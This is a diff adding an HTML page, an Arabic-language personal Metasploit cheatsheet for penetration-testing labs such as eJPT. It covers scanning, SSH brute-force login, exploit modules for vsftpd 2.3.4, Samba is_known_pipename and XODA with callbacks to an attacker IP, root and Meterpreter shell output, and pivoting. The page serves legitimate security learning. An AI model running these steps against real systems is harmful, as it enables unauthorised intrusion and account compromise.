@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<title>Metasploit Cheatsheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">METASPLOIT FRAMEWORK — MSFCONSOLE</span>
+<h1>Metasploit — من اختيار الـModule إلى إدارة الجلسة</h1>
+<p>مرجع عملي أثناء اللاب — Search → Info → Options → Check → Run → Session.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote"><b>ملاحظة:</b> Metasploit Framework ليس خدمة لها بورت ثابت. ابدأ دائمًا من Service/Version اكتشفته فعليًا، ثم استخدم الـModule المناسب بدل تشغيل Exploits عشوائية.</div>
+<div class="toc"><span class="ttl">الفهرس</span><ol><li><a href="#s1">Startup / Database / Workspaces</a></li><li><a href="#s2">Search &amp; Module Selection</a></li><li><a href="#s3">Module Options / Auxiliary Scanners</a></li><li><a href="#s4">Credential / Login Modules</a></li><li><a href="#s5">Exploits / Payloads / Handlers</a></li><li><a href="#s6">Sessions / Jobs / Post Modules / Routing</a></li></ol></div>
+<div class="stage" id="s1">
+<h2>1. Startup / Database / Workspaces</h2>
+<p class="desc">جهّز Metasploit والـworkspace وحدد الهدف قبل اختيار أي Module.</p>
+
+
+
+
+
+<div class="step"><div class="step-title">تشغيل Metasploit بهدوء <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">msfconsole -q</div>
+<div class="note">يفتح msfconsole بدون الـbanner الطويل؛ مناسب أثناء اللاب.</div></div><div class="step"><div class="step-title">عرض المساعدة الأساسية <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">help</div>
+<div class="note">إذا نسيت command أو syntax داخل msfconsole ابدأ من هنا.</div></div><div class="step"><div class="step-title">Scan من داخل Metasploit عند الحاجة <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">db_nmap -sS -sV [TARGET]</div>
+<div class="note">يشغّل Nmap ويضيف النتائج إلى قاعدة بيانات Metasploit إذا كانت متصلة.</div></div><div class="step"><div class="step-title">فحص TCP شامل عند الحاجة <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -p- --min-rate 1000 [TARGET]</div>
+<div class="danger">استخدم معدل الفحص المناسب للـLab أو قواعد الاختبار المصرح.</div></div><div class="step"><div class="step-title">تحديد الخدمات والإصدارات <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -sC -p[PORTS] [TARGET]</div>
+<div class="note">الـService/Version الناتج هو Trigger للبحث داخل Metasploit، وليس مجرد رقم البورت.</div></div><div class="step"><div class="step-title">تشغيل Auxiliary Scanner <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">run</div>
+<div class="note">اقرأ النتيجة ثم انتقل للخطوة التالية فقط إذا دعمتها الـEnumeration.</div></div><div class="step"><div class="step-title">تشغيل الاستغلال <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">run</div>
+<div class="danger">لا تشغّل Exploit لمجرد وجود نتيجة search. تأكد من الإصدار والـOS والـpreconditions أولًا.</div></div><div class="step"><div class="step-title">فحص واجهات Linux بعد الوصول <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami
+id
+ip addr</div>
+<div class="note">في أحد اللابات، ip addr كشف NIC ثانية وأعطى فرصة Pivoting؛ وجود NIC ثانية وحده لا يثبت نجاح Pivot.</div></div></div>
+<div class="stage" id="s2">
+<h2>2. Search &amp; Module Selection</h2>
+<p class="desc">Metasploit ليس بديلًا عن Nmap؛ استخدم نتائج الفحص لتحديد Service ثم اختر Scanner مناسب.</p>
+
+
+
+
+<div class="step"><div class="step-title">بحث عام عن الخدمة <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search [SERVICE]</div></div><div class="step"><div class="step-title">مراجعة Module قبل استخدامه <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">info [MODULE]
+use [MODULE]
+show options</div>
+<div class="note">راجع Description وReferences وRequired Options بدل تشغيل Module بالاسم فقط.</div></div><div class="step"><div class="step-title">SMB Shares / Users <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS [TARGET]
+run
+
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS [TARGET]
+run</div>
+<div class="tip">لا تحفظ Module names من الذاكرة للخدمات الأقل شيوعًا؛ إذا كنت غير متأكد استخدم search ثم info/show options.</div></div><div class="step"><div class="step-title">البحث عن Exploit مطابق <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:exploit [SERVICE] [VERSION]</div></div></div>
+<div class="stage" id="s3">
+<h2>3. Module Options / Auxiliary Scanners</h2>
+<p class="desc">ابحث عن Auxiliary scanners أولًا واجمع معلومات الخدمة قبل الانتقال إلى Exploit.</p>
+
+
+
+
+
+
+
+
+
+<div class="step"><div class="step-title">فحص اتصال قاعدة بيانات Metasploit <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">db_status</div>
+<div class="note">إذا كانت قاعدة البيانات متصلة تقدر تستخدم workspaces وhosts/services لتجميع نتائج اللاب.</div></div><div class="step"><div class="step-title">عرض Hosts المخزنة <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">hosts</div></div><div class="step"><div class="step-title">SSH Version <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/ssh/ssh_version
+set RHOSTS [TARGET]
+run</div></div><div class="step"><div class="step-title">SMTP User Enumeration <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS [TARGET]
+run</div></div></div>
+<div class="stage" id="s4">
+<h2>4. Credential / Login Modules</h2>
+<p class="desc">استخدم Login Scanners فقط عندما تكون المصادقة فعلًا جزءًا من الخدمة والاختبار مصرحًا به.</p>
+
+
+
+
+
+<div class="step"><div class="step-title">إنشاء Workspace للهدف <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">workspace -a [WORKSPACE]
+workspace</div>
+<div class="tip">استخدم Workspace منفصل لكل Lab حتى ما تختلط hosts وservices والـcredentials بين الأهداف.</div></div><div class="step"><div class="step-title">حصر النتائج في Auxiliary <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:auxiliary [SERVICE]</div>
+<div class="note">مفيد للـversion scanners، enumeration، login scanners وvulnerability checks.</div></div><div class="step"><div class="step-title">البحث عن Login Scanner <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:auxiliary [SERVICE] login</div></div><div class="step"><div class="step-title">مراجعة خيارات الـScanner <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use [LOGIN_MODULE]
+show options</div></div><div class="step"><div class="step-title">ضبط قوائم المستخدمين وكلمات المرور <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set RHOSTS [TARGET]
+set USER_FILE [USERLIST]
+set PASS_FILE [WORDLIST]
+set STOP_ON_SUCCESS true
+set VERBOSE true
+run</div>
+<div class="danger">Password spraying/brute force قد يسبب Lockout أو ضوضاء. نفذه فقط داخل Lab أو بتصريح صريح.</div></div><div class="step"><div class="step-title">SSH Login Scanner — مثال فعلي مستخدم بالمكتبة <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS [TARGET]
+set USER_FILE [USERLIST]
+set PASS_FILE [WORDLIST]
+set STOP_ON_SUCCESS true
+set VERBOSE true
+run</div>
+<div class="result">Success ... SSH session opened</div>
+<div class="note">الـoutput الفعلي يختلف حسب الهدف؛ ظهور Success/session هو دليل النجاح.</div></div></div>
+<div class="stage" id="s5">
+<h2>5. Exploits / Payloads / Handlers</h2>
+<p class="desc">اختيار Exploit مبني على Evidence: Service + Version + OS + Preconditions، وليس على البورت فقط.</p>
+
+
+
+
+
+
+
+
+
+<div class="step"><div class="step-title">عرض Services المخزنة <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">services</div>
+<div class="tip">Workflow سريع: Nmap → Service/Version → search داخل Metasploit → info → show options → check إن توفر.</div></div><div class="step"><div class="step-title">ضبط الهدف والبورت <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set RHOSTS [TARGET]
+set RPORT [PORT]
+show options</div>
+<div class="note"><b>RHOST/RHOSTS = الهدف.</b> لا تخلطها مع LHOST.</div></div><div class="step"><div class="step-title">مراجعة الـExploit والـTargets <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">info [EXPLOIT_MODULE]
+use [EXPLOIT_MODULE]
+show options
+show targets
+show payloads</div>
+<div class="note">راجع الـplatform والـtargets والـpayload compatibility والـrequired options.</div></div><div class="step"><div class="step-title">ضبط الهدف والـCallback <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">set RHOSTS [TARGET]
+set RPORT [PORT]
+set LHOST [ATTACKER_IP]
+set LPORT [LPORT]
+show options</div>
+<div class="danger"><b>قاعدة حرجة:</b> RHOST/RHOSTS هو الهدف، وLHOST هو عنوان جهازك الذي يستطيع الهدف الوصول له.</div></div><div class="step"><div class="step-title">Check قبل Exploit إذا كان مدعومًا <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">check</div>
+<div class="result">Server appears to be vulnerable / Check failed / Unknown — حسب الـModule والهدف.</div>
+<div class="note">check يساعد في تقليل التخمين لكنه لا يضمن نجاح الاستغلال.</div></div><div class="step"><div class="step-title">VSFTPD 2.3.4 <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST [TARGET]
+exploit</div>
+<div class="result">Backdoor service has been spawned...
+Command shell session opened
+whoami → root</div></div><div class="step"><div class="step-title">Samba is_known_pipename <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/linux/samba/is_known_pipename
+set RHOST [TARGET]
+check
+exploit</div>
+<div class="result">Found shell
+Command shell session opened
+id → uid=0(root)</div></div></div>
+<div class="stage" id="s6">
+<h2>6. Sessions / Jobs / Post Modules / Routing</h2>
+<p class="desc">بعد فتح Session، أكد السياق وأدر الجلسات فقط؛ التفاصيل الكبيرة لها ملفات Post-Exploitation مستقلة.</p>
+
+
+
+
+
+
+
+
+<div class="tip">بعد تأكيد الجلسة انتقل إلى Windows/Linux Post-Exploitation أو Privilege Escalation أو Credential Access أو Pivoting حسب النظام والهدف.</div>
+<div class="step"><div class="step-title">عرض الجلسات بعد Login ناجح <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">sessions
+sessions -i [SESSION_ID]</div>
+<div class="tip">بعد Credential ناجح، لا تكرر الاختبار. ادخل الجلسة وأكمل هدف اللاب.</div></div><div class="step"><div class="step-title">XODA File Upload <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/unix/webapp/xoda_file_upload
+set RHOSTS [TARGET]
+set TARGETURI /
+set LHOST [ATTACKER_IP]
+exploit</div>
+<div class="result">Meterpreter session opened → meterpreter &gt;</div></div><div class="step"><div class="step-title">عرض الجلسات <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">sessions</div></div><div class="step"><div class="step-title">الدخول إلى Session <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">sessions -i [SESSION_ID]</div></div><div class="step"><div class="step-title">تأكيد مستخدم Meterpreter <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid</div></div><div class="step"><div class="step-title">معلومات النظام <span class="where">METERPRETER</span></div>
+<div class="cmd">sysinfo</div></div><div class="step"><div class="step-title">الانتقال إلى System Shell عند الحاجة <span class="where">METERPRETER</span></div>
+<div class="cmd">shell</div></div><div class="step"><div class="step-title">إرجاع Session للخلفية <span class="where">METERPRETER</span></div>
+<div class="cmd">background</div>
+<div class="note">يرجعك إلى msfconsole مع إبقاء الجلسة موجودة.</div></div><div class="step"><div class="step-title">Autoroute عند وجود شبكة داخلية موثقة <span class="where">METERPRETER</span></div>
+<div class="cmd">run autoroute -s [SUBNET]</div>
+<div class="danger">إضافة Route ليست دليلًا على نجاح Pivot. لازم تثبت الوصول للشبكة الداخلية لاحقًا في ملف Pivoting.</div></div></div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
